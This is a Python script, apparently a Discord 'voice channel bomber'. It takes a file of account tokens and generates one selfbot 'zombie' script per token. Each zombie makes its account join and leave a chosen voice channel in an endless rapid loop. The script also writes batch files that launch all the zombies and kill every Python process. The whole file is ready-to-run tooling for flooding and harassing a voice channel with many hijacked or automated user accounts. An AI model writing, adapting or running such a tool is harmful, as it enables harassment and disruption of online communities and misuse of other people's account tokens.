from discord.ext import commands

def vc_bomber():

    tokens = open('tokens.txt'.strip()).readlines()
    channel_id = input('VCID > ')
    amount = 1

    with open('start.bat', 'w') as startall:
        startall.write(f'cd zombies\n')

    
    for token in tokens:
        rbracket = '{'
        lbracket = '}'

        content = f'''
from discord.ext import commands
import asyncio
selfbot = commands.Bot(command_prefix='>>', help_command=None, self_bot=True)
selfbot.remove_command('help')

@selfbot.event
async def on_ready():            
    channel = selfbot.get_channel(int({channel_id}))
    if channel is None:
        print(f'Channel not found')
    
    else:
        while True:
            await channel.connect()
            voice_client = channel.guild.voice_client
            await asyncio.sleep(0.5)
            await voice_client.disconnect()

selfbot.run('{token.strip()}')
'''
        with open(f'zombies/zombie{amount}.py', 'w') as zombie:
            zombie.write(content)

        with open('start.bat', 'a') as startall:
            startall.write(f'start python zombie{amount}.py\n')

        with open('kill.bat', 'w') as killall:
            killall.write('taskkill /im python.exe')

        amount+=1

vc_bomber()